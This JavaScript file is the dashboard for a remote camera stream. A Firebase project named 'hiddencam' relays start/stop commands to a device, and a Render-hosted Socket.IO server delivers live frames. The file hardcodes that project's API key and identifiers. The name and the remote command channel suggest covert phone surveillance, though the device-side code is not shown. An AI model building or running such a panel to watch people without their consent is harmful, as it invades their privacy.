// ============ Firebase Config ============
const firebaseConfig = {
    apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
    authDomain: "hiddencam-62e2d.firebaseapp.com",
    databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
    projectId: "hiddencam-62e2d",
    storageBucket: "hiddencam-62e2d.firebasestorage.app",
    messagingSenderId: "931792860891",
    appId: "1:931792860891:android:602d1099f876f4688d7efe"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Global variables
let currentDeviceId = localStorage.getItem('cctv_device_id') || '';
let socket = null;

// ============ Socket.IO Connection ============
const RENDER_SERVER_URL = 'https://server-3-phat.onrender.com';

function connectToStream() {
    if (socket) {
        socket.disconnect();
    }
    
    console.log('🔄 Connecting to render server...');
    
    socket = io(RENDER_SERVER_URL, {
        transports: ['websocket'],
        reconnection: true,
        reconnectionAttempts: 10,
        reconnectionDelay: 1000
    });
    
    socket.on('connect', () => {
        console.log('✅ Connected to stream server');
        addLog('✅ Connected to stream server');
        socket.emit('register_viewer');
    });
    
    socket.on('frame', (data) => {
        console.log('📸 Frame received, size:', data.byteLength);
        const blob = new Blob([data], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        const img = document.getElementById('liveFrame');
        if (img) {
            img.src = url;
            document.getElementById('streamStatus').innerHTML = '🟢 LIVE STREAM (15 FPS)';
            document.getElementById('streamStatus').style.color = '#4CAF50';
        }
        setTimeout(() => URL.revokeObjectURL(url), 100);
    });
    
    socket.on('disconnect', () => {
        console.log('⚠️ Disconnected from stream server');
        addLog('⚠️ Disconnected from stream server');
        document.getElementById('streamStatus').innerHTML = '⚫ Stream disconnected';
        document.getElementById('streamStatus').style.color = '#f44336';
    });
    
    socket.on('connect_error', (err) => {
        console.log('❌ Connection error:', err.message);
        addLog('❌ Connection error: ' + err.message);
    });
}

// ============ Send Command ============
function sendCommand(command) {
    if (!currentDeviceId) {
        alert('Please enter and save Device ID first!');
        return;
    }
    
    addLog(`📤 Sending command: ${command}`);
    
    database.ref(`camera/${currentDeviceId}/command`).set(command)
        .then(() => {
            addLog(`✅ Command "${command}" sent`);
        })
        .catch((error) => {
            addLog(`❌ Error: ${error.message}`);
        });
}

// ============ Listen to Device Status ============
function listenToDeviceStatus() {
    if (!currentDeviceId) return;
    
    const statusRef = database.ref(`camera/${currentDeviceId}`);
    
    statusRef.on('value', (snapshot) => {
        const data = snapshot.val();
        console.log('📊 Status update:', data);
        
        if (!data) {
            updateUI('offline', null);
            return;
        }
        
        updateUI(data.status || 'offline', data);
        
        if (data.currentResolution) {
            document.getElementById('resolutionDisplay').innerText = data.currentResolution;
        }
        if (data.streamUrl) {
            document.getElementById('streamUrlDisplay').innerText = data.streamUrl;
        }
        if (data.lastSeen) {
            const lastSeen = new Date(data.lastSeen);
            document.getElementById('lastSeen').innerText = lastSeen.toLocaleTimeString();
        }
    });
}

function updateUI(status, data) {
    const dot = document.getElementById('statusDot');
    const text = document.getElementById('statusText');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    
    dot.className = 'status-dot';
    
    switch(status) {
        case 'online':
            dot.classList.add('online');
            text.innerHTML = '🟢 ONLINE - Streaming Active';
            startBtn.disabled = true;
            stopBtn.disabled = false;
            addLog('📹 Device is ONLINE and streaming');
            break;
        case 'ready':
            dot.classList.add('ready');
            text.innerHTML = '🟠 READY - Camera ready';
            startBtn.disabled = false;
            stopBtn.disabled = true;
            addLog('✅ Device is READY');
            break;
        case 'offline':
            dot.classList.add('offline');
            text.innerHTML = '🔴 OFFLINE';
            startBtn.disabled = false;
            stopBtn.disabled = true;
            addLog('⚫ Device is OFFLINE');
            break;
        case 'permission_denied':
            dot.classList.add('offline');
            text.innerHTML = '⚠️ PERMISSION DENIED';
            startBtn.disabled = true;
            stopBtn.disabled = true;
            addLog('❌ Camera permission denied on device');
            break;
        default:
            dot.classList.add('offline');
            text.innerHTML = '⚫ UNKNOWN';
            addLog('⚠️ Unknown device status');
    }
}

// ============ Device ID Management ============
function saveDeviceId() {
    const deviceIdInput = document.getElementById('deviceId');
    const newDeviceId = deviceIdInput.value.trim();
    
    if (!newDeviceId) {
        alert('Enter Device ID');
        return;
    }
    
    currentDeviceId = newDeviceId;
    localStorage.setItem('cctv_device_id', currentDeviceId);
    document.getElementById('deviceIdDisplay').innerText = currentDeviceId;
    
    addLog(`📱 Device ID saved: ${currentDeviceId}`);
    listenToDeviceStatus();
}

function loadSavedDeviceId() {
    if (currentDeviceId) {
        document.getElementById('deviceId').value = currentDeviceId;
        document.getElementById('deviceIdDisplay').innerText = currentDeviceId;
        listenToDeviceStatus();
    }
}

// ============ Log Function ============
function addLog(message) {
    const logContainer = document.getElementById('logContainer');
    if (!logContainer) return;
    
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    const timestamp = new Date().toLocaleTimeString();
    logEntry.innerHTML = `[${timestamp}] ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    
    while (logContainer.children.length > 20) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

// ============ Initialize ============
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Dashboard loading...');
    connectToStream();
    loadSavedDeviceId();
    addLog('🚀 Dashboard initialized');
    addLog(`🎥 Render server: ${RENDER_SERVER_URL}`);
});
